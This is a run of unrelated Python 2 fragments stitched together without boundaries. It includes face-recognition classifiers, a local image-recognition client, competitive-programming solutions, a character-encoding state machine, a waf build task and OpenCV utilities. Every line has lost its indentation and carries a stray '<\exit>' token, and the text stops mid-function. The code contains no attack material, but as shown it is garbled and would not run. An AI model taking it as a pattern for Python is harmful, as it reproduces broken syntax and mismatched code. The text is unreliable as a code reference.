hist = dict((key, val) for key, val in enumerate(np.bincount(sorted_y[:self.k])) if val)<\exit>
predicted_label = max(hist.iteritems(), key=op.itemgetter(1))[0]<\exit>
return [predicted_label, {'labels': sorted_y, 'distances': sorted_distances, 'similarities': sorted_sim}]<\exit>
def __repr__(self):<\exit>
return "NearestNeighbor (k=%s, dist_metric=%s)" % (self.k, repr(self.dist_metric))<\exit>
try:<\exit>
from svmutil import *<\exit>
except ImportError:<\exit>
logger = logging.getLogger("facerec.classifier.SVM")<\exit>
logger.debug("Import Error: libsvm bindings not available.")<\exit>
except:<\exit>
logger = logging.getLogger("facerec.classifier.SVM")<\exit>
logger.debug("Import Error: libsvm bindings not available.")<\exit>
import sys<\exit>
from StringIO import StringIO<\exit>
from svmutil import *<\exit>
bkp_stdout = sys.stdout<\exit>
class SVM(AbstractClassifier):<\exit>
def __init__(self, param=None):<\exit>
AbstractClassifier.__init__(self)<\exit>
self.logger = logging.getLogger("facerec.classifier.SVM")<\exit>
self.param = param<\exit>
self.svm = svm_model()<\exit>
self.param = param<\exit>
if self.param is None:<\exit>
self.param = svm_parameter("-q")<\exit>
def compute(self, X, y):<\exit>
self.logger.debug("SVM TRAINING (C=%.2f,gamma=%.2f,p=%.2f,nu=%.2f,coef=%.2f,degree=%.2f)" % (<\exit>
self.param.C, self.param.gamma, self.param.p, self.param.nu, self.param.coef0, self.param.degree))<\exit>
X = asRowMatrix(X)<\exit>
y = np.asarray(y)<\exit>
problem = svm_problem(y, X.tolist())<\exit>
self.svm = svm_train(problem, self.param)<\exit>
self.y = y<\exit>
def predict(self, X):<\exit>
X = np.asarray(X).reshape(1, -1)<\exit>
sys.stdout = StringIO()<\exit>
p_lbl, p_acc, p_val = svm_predict([0], X.tolist(), self.svm)<\exit>
sys.stdout = bkp_stdout<\exit>
predicted_label = int(p_lbl[0])<\exit>
return [predicted_label, {'p_lbl': p_lbl, 'p_acc': p_acc, 'p_val': p_val}]<\exit>
def __repr__(self):<\exit>
return "Support Vector Machine (kernel_type=%s, C=%.2f,gamma=%.2f,p=%.2f,nu=%.2f,coef=%.2f,degree=%.2f)" % (<\exit>
self.param.kernel_type, self.param.C, self.param.gamma, self.param.p, self.param.nu,<\exit>
self.param.coef0, self.param.degree)<\exit>
import abc<\exit>
from weakref import WeakKeyDictionary<\exit>
class Shape(object):<\exit>
__metaclass__ = abc.ABCMeta<\exit>
@abc.abstractmethod<\exit>
def method_to_implement(self, i):<\exit>
return<\exit>
class Resistor(object):<\exit>
def __init__(self, ohms):<\exit>
self.ohms = ohms<\exit>
self.voltage = 0<\exit>
self.current = 0<\exit>
class VoltageResistance(Resistor):<\exit>
def __init__(self, ohms):<\exit>
super(VoltageResistance, self).__init__(ohms)<\exit>
self._voltage = 0<\exit>
@property<\exit>
def voltage(self):<\exit>
return self._voltage<\exit>
@voltage.setter<\exit>
def voltage(self, voltage):<\exit>
self._voltage = voltage<\exit>
self.current = self._voltage / self.ohms<\exit>
class GradeDescriptor(object):<\exit>
def __init__(self):<\exit>
self._values = WeakKeyDictionary()<\exit>
def __get__(self, instance, instance_type):<\exit>
if instance is None: return self<\exit>
return self._values.get(instance, 0)<\exit>
def __set__(self, instance, value):<\exit>
if not (0 <= value <= 100):<\exit>
raise ValueError("Grade must be between 0 and 100")<\exit>
self._values[instance] = value<\exit>
import json<\exit>
import base64<\exit>
import urllib2<\exit>
SERVER_ADDRESS = "http://localhost:5000"<\exit>
class FaceRecClient(object):<\exit>
def __init__(self, url):<\exit>
self.url = url<\exit>
def getBase64(self, filename):<\exit>
with open(filename, "rb") as image_file:<\exit>
encoded_string = base64.b64encode(image_file.read())<\exit>
return encoded_string<\exit>
def request(self, api_func, request_data):<\exit>
url_func = "%s/api/%s" % (self.url, api_func)<\exit>
req = urllib2.Request(url=url_func, data = json.dumps(request_data), headers = {'content-type': 'application/json'})<\exit>
res = urllib2.urlopen(req)<\exit>
return res.read()<\exit>
def recognize(self, filename):<\exit>
base64Image = self.getBase64(filename)<\exit>
json_data = { "image" : base64Image }<\exit>
api_result = self.request("recognize", json_data)<\exit>
print json.loads(api_result)<\exit>
if __name__ == '__main__':<\exit>
from argparse import ArgumentParser<\exit>
parser = ArgumentParser()<\exit>
parser.add_argument("-s", "--server", action="store", dest="host", default=SERVER_ADDRESS,<\exit>
help="Sets the endpoint for the server to call.", required=False)<\exit>
parser.add_argument('image', nargs='+', help="Images to call the server with.")<\exit>
print "=== Usage ==="<\exit>
parser.print_help()<\exit>
args = parser.parse_args()<\exit>
print "=== Predictions ==="<\exit>
faceRecClient = FaceRecClient(args.host)<\exit>
for image in args.image:<\exit>
faceRecClient.recognize(image)<\exit>
class Solution(object):<\exit>
def solve(self, cipher):<\exit>
N, M = cipher<\exit>
low = 0<\exit>
high = N<\exit>
while low + 1 < high:<\exit>
mid = (low + high) / 2<\exit>
r = self.Turan(N, mid)<\exit>
if r < M:<\exit>
low = mid<\exit>
else:<\exit>
high = mid<\exit>
return high<\exit>
def Turan(self, n, r):<\exit>
return 0.5 * (n ** 2 - (n % r) * (n / r + 1) ** 2 - (r - (n % r)) * (n / r) ** 2)<\exit>
if __name__ == "__main__":<\exit>
import sys<\exit>
f = open("1.in", "r")<\exit>
testcases = int(f.readline().strip())<\exit>
for t in xrange(testcases):<\exit>
cipher = map(int, f.readline().strip().split(' '))<\exit>
s = "%s\n" % (Solution().solve(cipher))<\exit>
print s,<\exit>
class Solution(object):<\exit>
def solve(self, cipher):<\exit>
a, b, x = cipher<\exit>
if a > 1:<\exit>
result = int((a ** b) / float(x) + 0.5) * x<\exit>
else:<\exit>
result = 1<\exit>
if result != int(result):<\exit>
if result > 0.5 and x == 1:<\exit>
return 1<\exit>
else:<\exit>
return 0<\exit>
return result<\exit>
if __name__ == "__main__":<\exit>
import sys<\exit>
f = open("1.in", "r")<\exit>
testcases = int(f.readline().strip())<\exit>
for t in xrange(testcases):<\exit>
cipher = map(int, f.readline().strip().split(' '))<\exit>
s = "%s\n" % (Solution().solve(cipher))<\exit>
print s,<\exit>
class Solution(object):<\exit>
def solve(self, cipher):<\exit>
N, A = cipher<\exit>
A.sort()<\exit>
diff = 1 << 31<\exit>
lst = []<\exit>
for i in xrange(N - 1):<\exit>
b = A[i + 1]<\exit>
a = A[i]<\exit>
if abs(a - b) < diff:<\exit>
diff = abs(a - b)<\exit>
lst = [a, b]<\exit>
elif abs(a - b) == diff:<\exit>
lst.append(a)<\exit>
lst.append(b)<\exit>
return " ".join(map(str, lst))<\exit>
if __name__ == "__main__":<\exit>
import sys<\exit>
f = open("1.in", "r")<\exit>
solution = Solution()<\exit>
N = int(f.readline().strip())<\exit>
A = map(int, f.readline().strip().split(' '))<\exit>
cipher = N, A<\exit>
s = "%s\n" % (solution.solve(cipher))<\exit>
print s,<\exit>
import json<\exit>
import codecs<\exit>
class Codec(object):<\exit>
def decode(self, jsn):<\exit>
return json.dumps(jsn, ensure_ascii=False, encoding='utf-8')<\exit>
def write(self, jsn, filename):<\exit>
with codecs.open(filename, "w", encoding="utf-8") as file:<\exit>
file.write(jsn)<\exit>
from .constants import eStart<\exit>
from .compat import wrap_ord<\exit>
class CodingStateMachine:<\exit>
def __init__(self, sm):<\exit>
self._mModel = sm<\exit>
self._mCurrentBytePos = 0<\exit>
self._mCurrentCharLen = 0<\exit>
self.reset()<\exit>
def reset(self):<\exit>
self._mCurrentState = eStart<\exit>
def next_state(self, c):<\exit>
byteCls = self._mModel['classTable'][wrap_ord(c)]<\exit>
if self._mCurrentState == eStart:<\exit>
self._mCurrentBytePos = 0<\exit>
self._mCurrentCharLen = self._mModel['charLenTable'][byteCls]<\exit>
curr_state = (self._mCurrentState * self._mModel['classFactor']<\exit>
+ byteCls)<\exit>
self._mCurrentState = self._mModel['stateTable'][curr_state]<\exit>
self._mCurrentBytePos += 1<\exit>
return self._mCurrentState<\exit>
def get_current_charlen(self):<\exit>
return self._mCurrentCharLen<\exit>
def get_coding_state_machine(self):<\exit>
return self._mModel['name']<\exit>
import sys<\exit>
class Solution(object):<\exit>
def __init__(self):<\exit>
self.dirs = [(0, 1, 'L'), (0, -1, 'R'), (-1, 0, 'D'), (1, 0, 'U')]<\exit>
def solve(self, cipher):<\exit>
M, N, K, mat = cipher<\exit>
i_dest = -1<\exit>
j_dest = -1<\exit>
for i in xrange(M):<\exit>
for j in xrange(N):<\exit>
if mat[i][j] == "*":<\exit>
i_dest = i<\exit>
j_dest = j<\exit>
break<\exit>
f = [[[sys.maxint for _ in xrange(N)] for _ in xrange(M)] for _ in xrange(K + 1)]<\exit>
for k in xrange(K + 1):<\exit>
f[k][0][0] = 0<\exit>
for k in xrange(1, K + 1):<\exit>
for i in xrange(0, M):<\exit>
for j in xrange(0, N):<\exit>
for dir in self.dirs:<\exit>
i_pre = i + dir[0]<\exit>
j_pre = j + dir[1]<\exit>
if 0 <= i_pre < M and 0 <= j_pre < N:<\exit>
if mat[i_pre][j_pre] == dir[2]:<\exit>
f[k][i][j] = min(f[k][i][j], f[k - 1][i_pre][j_pre])<\exit>
else:<\exit>
f[k][i][j] = min(f[k][i][j], f[k - 1][i_pre][j_pre] + 1)<\exit>
mini = sys.maxint<\exit>
for k in xrange(K + 1):<\exit>
mini = min(mini, f[k][i_dest][j_dest])<\exit>
return mini if mini != sys.maxint else -1<\exit>
if __name__ == "__main__":<\exit>
f = open("0.in", "r")<\exit>
solution = Solution()<\exit>
M, N, K = map(int, f.readline().strip().split(' '))<\exit>
mat = []<\exit>
for i in xrange(M):<\exit>
mat.append(list(f.readline().strip()))<\exit>
cipher = M, N, K, mat<\exit>
s = "%s\n" % (solution.solve(cipher))<\exit>
print s,<\exit>
class Solution_TLE(object):<\exit>
def __init__(self):<\exit>
self.coinage = [10, 5, 2, 1]<\exit>
def solve(self, cipher):<\exit>
target, lst = cipher<\exit>
lst.reverse()<\exit>
result = [0]<\exit>
self.dfs(lst, target, result)<\exit>
return result[0]<\exit>
def dfs(self, seq, remaining, result):<\exit>
if remaining < 0:<\exit>
return<\exit>
if remaining == 0:<\exit>
result[0] += 1<\exit>
return<\exit>
bound = 0<\exit>
for i in xrange(4):<\exit>
bound += seq[i] * self.coinage[i]<\exit>
if bound < remaining:<\exit>
return<\exit>
for j in xrange(4):<\exit>
for i in xrange(seq[j]):<\exit>
remaining -= (i + 1) * self.coinage[j]<\exit>
self.dfs([0] * (j + 1) + seq[j + 1:], remaining, result)<\exit>
remaining += (i + 1) * self.coinage[j]<\exit>
class Solution(object):<\exit>
def __init__(self):<\exit>
self.coinage = [1, 2, 5, 10]<\exit>
self.count = {}<\exit>
self.A = None<\exit>
def solve(self, cipher):<\exit>
target, self.A = cipher<\exit>
return self.get_count(target, 3)<\exit>
def get_count(self, n, k):<\exit>
if (n, k) not in self.count:<\exit>
if k == 0:<\exit>
if n % self.coinage[k] == 0 and self.coinage[k] * self.A[k] >= n:<\exit>
self.count[(n, k)] = 1<\exit>
else:<\exit>
self.count[(n, k)] = 0<\exit>
else:<\exit>
i = 0<\exit>
cnt = 0<\exit>
while i <= self.A[k] and i * self.coinage[k] <= n:<\exit>
cnt += self.get_count(n - i * self.coinage[k], k - 1)<\exit>
i += 1<\exit>
self.count[(n, k)] = cnt<\exit>
return self.count[(n, k)]<\exit>
if __name__ == "__main__":<\exit>
import sys<\exit>
f = open("1.in", "r")<\exit>
testcases = int(f.readline().strip())<\exit>
for t in xrange(testcases):<\exit>
target = int(f.readline().strip())<\exit>
lst = map(int, f.readline().strip().split(' '))<\exit>
cipher = target, lst<\exit>
s = "%s\n" % (Solution().solve(cipher))<\exit>
print s,<\exit>
class Solution:<\exit>
def firstWillWin_MLE(self, values):<\exit>
n = len(values)<\exit>
if n <= 2:<\exit>
return True<\exit>
F = [[0 for _ in xrange(n)] for _ in xrange(2)]<\exit>
s = [0 for _ in xrange(n)]<\exit>
s[n-1] = values[n-1]<\exit>
for i in xrange(n-2, -1, -1):<\exit>
s[i] = values[i] + s[i+1]<\exit>
F[0][n-1] = F[1][n-1] = s[n-1]<\exit>
F[0][n-2] = F[1][n-2] = s[n-2]<\exit>
for i in xrange(n-3, -1, -1):<\exit>
for p in xrange(2):<\exit>
F[p][i] = max(<\exit>
values[i]+s[i+1]-F[1^p][i+1],<\exit>
values[i]+values[i+1]+s[i+2]-F[1^p][i+2]<\exit>
)<\exit>
if F[0][0]>F[1][1] or F[0][0]>F[1][2]:<\exit>
return True<\exit>
return False<\exit>
def firstWillWin(self, values):<\exit>
n = len(values)<\exit>
if n <= 2:<\exit>
return True<\exit>
F = [[0 for _ in xrange(4)] for _ in xrange(2)]<\exit>
s = values[n-1]<\exit>
F[0][(n-1)%4] = F[1][(n-1)%4] = s<\exit>
s += values[n-2]<\exit>
F[0][(n-2)%4] = F[1][(n-2)%4] = s<\exit>
for i in xrange(n-3, -1, -1):<\exit>
for p in xrange(2):<\exit>
t = i%4<\exit>
F[p][t] = max(<\exit>
values[i]+s-F[1^p][(t+1)%4],<\exit>
values[i]+s-F[1^p][(t+2)%4]<\exit>
)<\exit>
if i == 0:<\exit>
break<\exit>
s += values[i]<\exit>
t = 0<\exit>
if F[0][t] > F[1][(t+1)%4] or F[0][t] > F[1][(t+2)%4]:<\exit>
return True<\exit>
return False<\exit>
if __name__ == "__main__":<\exit>
values = [16,27,25,23,25,16,12,9,1,2,7,20,19,23,16,0,6,22,16,11,8,27,9,2,20,2,13,7,25,29,12,12,18,29,27,13,16,1,22,<\exit>
9,3,21,29,14,7,8,14,5,0,23,16,1,20]<\exit>
assert Solution().firstWillWin(values)==True<\exit>
class Solution:<\exit>
def firstWillWin_MLE(self, values):<\exit>
n = len(values)<\exit>
if n == 1:<\exit>
return True<\exit>
F = [[[0 for _ in xrange(n)] for _ in xrange(n)] for _ in xrange(2)]<\exit>
s = [0 for _ in xrange(n+1)]<\exit>
for i in xrange(1, n+1):<\exit>
s[i] = s[i-1]+values[i-1]<\exit>
for i in xrange(n):<\exit>
for p in xrange(2):<\exit>
F[p][i][i] = values[i]<\exit>
for i in xrange(n-2, -1, -1):<\exit>
for j in xrange(i+1, n):<\exit>
for p in xrange(2):<\exit>
F[p][i][j] = max(<\exit>
values[i]+s[j+1]-s[i+1]-F[1^p][i+1][j],<\exit>
values[j]+s[j]-s[i]-F[1^p][i][j-1]<\exit>
)<\exit>
return F[0][0][n-1]>min(F[1][0][n-2], F[1][1][n-1])<\exit>
def firstWillWinNormalCase(self, values):<\exit>
n = len(values)<\exit>
if n == 1:<\exit>
return True<\exit>
SZ = 4<\exit>
F = [[[0 for _ in xrange(SZ)] for _ in xrange(SZ)] for _ in xrange(2)]<\exit>
s = [0 for _ in xrange(n+1)]<\exit>
for i in xrange(1, n+1):<\exit>
s[i] = s[i-1]+values[i-1]<\exit>
for i in xrange(n-2, -1, -1):<\exit>
for j in xrange(i+1, n):<\exit>
for p in xrange(2):<\exit>
if j == i+1:<\exit>
a = values[i+1]<\exit>
b = values[i]<\exit>
else:<\exit>
a = F[1^p][(i+1)%SZ][j%SZ]<\exit>
b = F[1^p][i%SZ][(j-1)%SZ]<\exit>
F[p][i%SZ][j%SZ] = max(<\exit>
values[i]+s[j+1]-s[i+1]-a,<\exit>
values[j]+s[j]-s[i]-b<\exit>
)<\exit>
return F[0][0][(n-1)%SZ] > min(F[1][0][(n-2)%SZ], F[1][1][(n-1)%SZ])<\exit>
def firstWillWin(self, values):<\exit>
n = len(values)<\exit>
if n%2 == 0 and self.firstWillWinEven(values):<\exit>
return True<\exit>
return self.firstWillWinNormalCase(values)<\exit>
def firstWillWinEven(self, values):<\exit>
odd_s = 0<\exit>
even_s = 0<\exit>
for i in xrange(len(values)):<\exit>
if i%2 == 0:<\exit>
even_s += values[i]<\exit>
else:<\exit>
odd_s += values[i]<\exit>
return odd_s != even_s<\exit>
if __name__ == "__main__":<\exit>
assert Solution().firstWillWin([3, 2, 2]) is True<\exit>
assert Solution().firstWillWin([1, 20, 4]) is False<\exit>
assert Solution().firstWillWin([1, 2, 3, 4, 5, 6, 7, 8, 13, 11, 10, 9]) is True<\exit>
class Solution:<\exit>
def firstWillWin(self, n):<\exit>
return not n%3 == 0<\exit>
from sklearn.cluster import KMeans<\exit>
import matplotlib.pyplot as plt<\exit>
import numpy as np<\exit>
import argparse<\exit>
import cv2<\exit>
def centroid_histogram(clt):<\exit>
numLabels = np.arange(0, len(np.unique(clt.labels_)) + 1)<\exit>
(hist, _) = np.histogram(clt.labels_, bins = numLabels)<\exit>
hist = hist.astype("float")<\exit>
hist /= hist.sum()<\exit>
return hist<\exit>
def plot_colors(hist, centroids):<\exit>
bar = np.zeros((50, 300, 3), dtype = "uint8")<\exit>
startX = 0<\exit>
for (percent, color) in zip(hist, centroids):<\exit>
endX = startX + (percent * 300)<\exit>
cv2.rectangle(bar, (int(startX), 0), (int(endX), 50),<\exit>
color.astype("uint8").tolist(), -1)<\exit>
startX = endX<\exit>
return bar<\exit>
ap = argparse.ArgumentParser()<\exit>
ap.add_argument("-i", "--image", required=True, help="Path to the image")<\exit>
ap.add_argument("-c", "--clusters", required=True, type=int,<\exit>
help="# of clusters")<\exit>
args = vars(ap.parse_args())<\exit>
image = cv2.imread(args["image"])<\exit>
image = cv2.cvtColor(image, cv2.COLOR_BGR2RGB)<\exit>
plt.figure()<\exit>
plt.axis("off")<\exit>
plt.imshow(image)<\exit>
image = image.reshape((image.shape[0]*image.shape[1], 3))<\exit>
clt = KMeans(n_clusters=args["clusters"])<\exit>
clt.fit(image)<\exit>
hist = centroid_histogram(clt)<\exit>
bar = plot_colors(hist, clt.cluster_centers_)<\exit>
plt.figure()<\exit>
plt.axis("off")<\exit>
plt.imshow(bar)<\exit>
plt.show()<\exit>
from argparse import ArgumentParser, FileType<\exit>
from colorsys import hls_to_rgb, rgb_to_hls<\exit>
from sys import stdin, stdout<\exit>
def _argparser():<\exit>
argparser = ArgumentParser()<\exit>
argparser.add_argument('-i', '--input', type=FileType('r'), default=stdin)<\exit>
argparser.add_argument('-o', '--output', type=FileType('w'), default=stdout)<\exit>
argparser.add_argument('-c', '--visual-conf', action='store_true')<\exit>
return argparser<\exit>
def main(args):<\exit>
argp = _argparser().parse_args(args[1:])<\exit>
lbls = [l.rstrip('\n') for l in argp.input]<\exit>
assert len(lbls) <= 100, 'currently not supporting more than a hundred'<\exit>
hue, lightness, saturation = rgb_to_hls(1.0, 0.0, 0.0)<\exit>
lightness += 0.05<\exit>
hue_step = 1.0 / len(lbls)<\exit>
for lbl in lbls:<\exit>
hex_output = '#{:02x}{:02x}{:02x}'.format(*[int(255 * e)<\exit>
for e in hls_to_rgb(hue, lightness, saturation)])<\exit>
if argp.visual_conf:<\exit>
argp.output.write('{}\tbgColor:{}'.format(lbl, hex_output))<\exit>
else:<\exit>
argp.output.write(hex_output)<\exit>
argp.output.write('\n')<\exit>
hue += hue_step<\exit>
return 0<\exit>
if __name__ == '__main__':<\exit>
from sys import argv<\exit>
exit(main(argv))<\exit>
import TaskGen<\exit>
import Node, Task, Utils, Build<\exit>
import subprocess<\exit>
import Options<\exit>
import shellcmd<\exit>
from Logs import debug, error<\exit>
shellcmd.debug = debug<\exit>
import Task<\exit>
import re<\exit>
arg_rx = re.compile(r"(?P<dollar>\$\$)|(?P<subst>\$\{(?P<var>\w+)(?P<code>.*?)\})", re.M)<\exit>
class command_task(Task.Task):<\exit>
color = "BLUE"<\exit>
def __init__(self, env, generator):<\exit>
Task.Task.__init__(self, env=env, normal=1, generator=generator)<\exit>
def __str__(self):<\exit>
"string to display to the user"<\exit>
env = self.env<\exit>
src_str = ' '.join([a.nice_path(env) for a in self.inputs])<\exit>
tgt_str = ' '.join([a.nice_path(env) for a in self.outputs])<\exit>
if self.outputs:<\exit>
sep = ' -> '<\exit>
else:<\exit>
sep = ''<\exit>
pipeline = shellcmd.Pipeline()<\exit>
pipeline.parse(self.generator.command)<\exit>
cmd = pipeline.get_abbreviated_command()<\exit>
return 'command (%s): %s%s%s\n' % (cmd, src_str, sep, tgt_str)<\exit>
def _subst_arg(self, arg, direction, namespace):<\exit>
def repl(match):<\exit>
if match.group('dollar'):<\exit>
return "$"<\exit>
elif match.group('subst'):<\exit>
var = match.group('var')<\exit>
code = match.group('code')<\exit>
result = eval(var+code, namespace)<\exit>
if isinstance(result, Node.Node):<\exit>
if var == 'TGT':<\exit>
return result.get_bld().abspath()<\exit>
elif var == 'SRC':<\exit>
return result.srcpath()<\exit>
else:<\exit>
raise ValueError("Bad subst variable %r" % var)<\exit>
elif result is self.inputs:<\exit>
if len(self.inputs) == 1:<\exit>
return result[0].srcpath()<\exit>
else:<\exit>
raise ValueError("${SRC} requested but have multiple sources; which one?")<\exit>
elif result is self.outputs:<\exit>
if len(self.outputs) == 1:<\exit>
return result[0].get_bld().abspath()<\exit>
else:<\exit>
raise ValueError("${TGT} requested but have multiple targets; which one?")<\exit>
elif isinstance(result, list):<\exit>
assert len(result) == 1<\exit>
return result[0]<\exit>
else:<\exit>
return result<\exit>
return None<\exit>
return arg_rx.sub(repl, arg)<\exit>
def run(self):<\exit>
pipeline = shellcmd.Pipeline()<\exit>
pipeline.parse(self.generator.command)<\exit>
namespace = self.env.get_merged_dict()<\exit>
if self.generator.variables is not None:<\exit>
namespace.update(self.generator.variables)<\exit>
namespace.update(env=self.env, SRC=self.inputs, TGT=self.outputs)<\exit>
for cmd in pipeline.pipeline:<\exit>
if isinstance(cmd, shellcmd.Command):<\exit>
if isinstance(cmd.stdin, basestring):<\exit>
cmd.stdin = self._subst_arg(cmd.stdin, 'in', namespace)<\exit>
if isinstance(cmd.stdout, basestring):<\exit>
cmd.stdout = self._subst_arg(cmd.stdout, 'out', namespace)<\exit>
if isinstance(cmd.stderr, basestring):<\exit>
cmd.stderr = self._subst_arg(cmd.stderr, 'out', namespace)<\exit>
for argI in xrange(len(cmd.argv)):<\exit>
cmd.argv[argI] = self._subst_arg(cmd.argv[argI], None, namespace)<\exit>
if cmd.env_vars is not None:<\exit>
env_vars = dict()<\exit>
for name, value in cmd.env_vars.iteritems():<\exit>
env_vars[name] = self._subst_arg(value, None, namespace)<\exit>
cmd.env_vars = env_vars<\exit>
elif isinstance(cmd, shellcmd.Chdir):<\exit>
cmd.dir = self._subst_arg(cmd.dir, None, namespace)<\exit>
return pipeline.run(verbose=(Options.options.verbose > 0))<\exit>
@TaskGen.taskgen_method<\exit>
@TaskGen.feature('command')<\exit>
def init_command(self):<\exit>
Utils.def_attrs(self,<\exit>
variables = None,<\exit>
rule='')<\exit>
@TaskGen.feature('command')<\exit>
@TaskGen.after_method('process_rule')<\exit>
def apply_command(self):<\exit>
task = self.create_task('command')<\exit>
setattr(task, "dep_vars", getattr(self, "dep_vars", None))<\exit>
inputs = []<\exit>
for node in self.source:<\exit>
inputs.append(node)<\exit>
task.set_inputs(inputs)<\exit>
task.set_outputs([self.path.find_or_declare(tgt) for tgt in self.to_list(self.target)])<\exit>
self.source = ''<\exit>
class Solution(object):<\exit>
def solve_error(self, cipher):<\exit>
a, b = cipher<\exit>
m = len(a)<\exit>
n = len(b)<\exit>
dp = [[0 for _ in xrange(n + 1)] for _ in xrange(m + 1)]<\exit>
for i in xrange(1, m + 1):<\exit>
for j in xrange(1, n + 1):<\exit>
if a[i - 1] == b[j - 1]:<\exit>
dp[i][j] = min(dp[i][j - 1], dp[i - 1][j]) + 1<\exit>
else:<\exit>
dp[i][j] = max(dp[i][j - 1], dp[i - 1][j])<\exit>
return dp[-1][-1]<\exit>
def solve(self, cipher):<\exit>
a, b = cipher<\exit>
m = len(a)<\exit>
n = len(b)<\exit>
dp = [[0 for _ in xrange(n + 1)] for _ in xrange(m + 1)]<\exit>
for i in xrange(1, m + 1):<\exit>
for j in xrange(1, n + 1):<\exit>
if a[i - 1] == b[j - 1]:<\exit>
dp[i][j] = dp[i - 1][j - 1] + 1<\exit>
else:<\exit>
dp[i][j] = max(dp[i][j - 1], dp[i - 1][j])<\exit>
return dp[-1][-1]<\exit>
if __name__ == "__main__":<\exit>
import sys<\exit>
f = open("1.in", "r")<\exit>
cipher = []<\exit>
cipher.append(f.readline().strip())<\exit>
cipher.append(f.readline().strip())<\exit>
s = "%s\n" % (Solution().solve(cipher))<\exit>
print s,<\exit>
import numpy as np<\exit>
import cv2<\exit>
import os<\exit>
from contextlib import contextmanager<\exit>
import itertools as it<\exit>
image_extensions = ['.bmp', '.jpg', '.jpeg', '.png', '.tif', '.tiff', '.pbm', '.pgm', '.ppm']<\exit>
class Bunch(object):<\exit>
def __init__(self, **kw):<\exit>
self.__dict__.update(kw)<\exit>
def __str__(self):<\exit>
return str(self.__dict__)<\exit>
def splitfn(fn):<\exit>
path, fn = os.path.split(fn)<\exit>
name, ext = os.path.splitext(fn)<\exit>
return path, name, ext<\exit>
def anorm2(a):<\exit>
return (a*a).sum(-1)<\exit>
def anorm(a):<\exit>
return np.sqrt( anorm2(a) )<\exit>
def homotrans(H, x, y):<\exit>
xs = H[0, 0]*x + H[0, 1]*y + H[0, 2]<\exit>
ys = H[1, 0]*x + H[1, 1]*y + H[1, 2]<\exit>
s  = H[2, 0]*x + H[2, 1]*y + H[2, 2]<\exit>
return xs/s, ys/s<\exit>
def to_rect(a):<\exit>
a = np.ravel(a)<\exit>
if len(a) == 2:<\exit>
a = (0, 0, a[0], a[1])<\exit>
return np.array(a, np.float64).reshape(2, 2)<\exit>
def rect2rect_mtx(src, dst):<\exit>
src, dst = to_rect(src), to_rect(dst)<\exit>
cx, cy = (dst[1] - dst[0]) / (src[1] - src[0])<\exit>
tx, ty = dst[0] - src[0] * (cx, cy)<\exit>
M = np.float64([[ cx,  0, tx],<\exit>
[  0, cy, ty],<\exit>
[  0,  0,  1]])<\exit>
return M<\exit>
def lookat(eye, target, up = (0, 0, 1)):<\exit>
fwd = np.asarray(target, np.float64) - eye<\exit>
fwd /= anorm(fwd)<\exit>
right = np.cross(fwd, up)<\exit>
right /= anorm(right)<\exit>
down = np.cross(fwd, right)<\exit>
R = np.float64([right, down, fwd])<\exit>
tvec = -np.dot(R, eye)<\exit>
return R, tvec<\exit>
def mtx2rvec(R):<\exit>
w, u, vt = cv2.SVDecomp(R - np.eye(3))<\exit>
p = vt[0] + u[:,0]*w[0]<\exit>
c = np.dot(vt[0], p)<\exit>
s = np.dot(vt[1], p)<\exit>
axis = np.cross(vt[0], vt[1])<\exit>
return axis * np.arctan2(s, c)<\exit>
def draw_str(dst, (x, y), s):<\exit>
cv2.putText(dst, s, (x+1, y+1), cv2.FONT_HERSHEY_PLAIN, 1.0, (0, 0, 0), thickness = 2, lineType=cv2.CV_AA)<\exit>
cv2.putText(dst, s, (x, y), cv2.FONT_HERSHEY_PLAIN, 1.0, (255, 255, 255), lineType=cv2.CV_AA)<\exit>
class Sketcher:<\exit>
def __init__(self, windowname, dests, colors_func):<\exit>
self.prev_pt = None<\exit>
self.windowname = windowname<\exit>
self.dests = dests<\exit>
self.colors_func = colors_func<\exit>
self.dirty = False<\exit>
self.show()<\exit>
cv2.setMouseCallback(self.windowname, self.on_mouse)<\exit>
def show(self):<\exit>
cv2.imshow(self.windowname, self.dests[0])<\exit>
def on_mouse(self, event, x, y, flags, param):<\exit>
pt = (x, y)<\exit>
if event == cv2.EVENT_LBUTTONDOWN:<\exit>
self.prev_pt = pt<\exit>
if self.prev_pt and flags & cv2.EVENT_FLAG_LBUTTON:<\exit>
for dst, color in zip(self.dests, self.colors_func()):<\exit>
cv2.line(dst, self.prev_pt, pt, color, 5)<\exit>
self.dirty = True<\exit>
self.prev_pt = pt<\exit>
self.show()<\exit>
else:<\exit>
self.prev_pt = None<\exit>
_jet_data =   {'red':   ((0., 0, 0), (0.35, 0, 0), (0.66, 1, 1), (0.89,1, 1),<\exit>
(1, 0.5, 0.5)),<\exit>
'green': ((0., 0, 0), (0.125,0, 0), (0.375,1, 1), (0.64,1, 1),<\exit>
(0.91,0,0), (1, 0, 0)),<\exit>
'blue':  ((0., 0.5, 0.5), (0.11, 1, 1), (0.34, 1, 1), (0.65,0, 0),<\exit>
(1, 0, 0))}<\exit>
cmap_data = { 'jet' : _jet_data }<\exit>
def make_cmap(name, n=256):<\exit>
data = cmap_data[name]<\exit>
xs = np.linspace(0.0, 1.0, n)<\exit>
channels = []<\exit>
eps = 1e-6<\exit>
for ch_name in ['blue', 'green', 'red']:<\exit>
ch_data = data[ch_name]<\exit>
xp, yp = [], []<\exit>
for x, y1, y2 in ch_data:<\exit>
xp += [x, x+eps]<\exit>
yp += [y1, y2]<\exit>
ch = np.interp(xs, xp, yp)<\exit>
channels.append(ch)<\exit>
return np.uint8(np.array(channels).T*255)<\exit>
def nothing(*arg, **kw):<\exit>
pass<\exit>
def clock():<\exit>
return cv2.getTickCount() / cv2.getTickFrequency()<\exit>
@contextmanager<\exit>
def Timer(msg):<\exit>
print msg, '...',<\exit>
start = clock()<\exit>
try:<\exit>
yield<\exit>
finally:<\exit>
print "%.2f ms" % ((clock()-start)*1000)<\exit>
class StatValue:<\exit>
def __init__(self, smooth_coef = 0.5):<\exit>
self.value = None<\exit>
self.smooth_coef = smooth_coef<\exit>
def update(self, v):<\exit>
if self.value is None:<\exit>
self.value = v<\exit>
else:<\exit>
c = self.smooth_coef<\exit>
self.value = c * self.value + (1.0-c) * v<\exit>
class RectSelector:<\exit>
def __init__(self, win, callback):<\exit>
self.win = win<\exit>
self.callback = callback<\exit>
cv2.setMouseCallback(win, self.onmouse)<\exit>
self.drag_start = None<\exit>
self.drag_rect = None<\exit>
def onmouse(self, event, x, y, flags, param):<\exit>
x, y = np.int16([x, y])<\exit>
if event == cv2.EVENT_LBUTTONDOWN:<\exit>
self.drag_start = (x, y)<\exit>
if self.drag_start:<\exit>
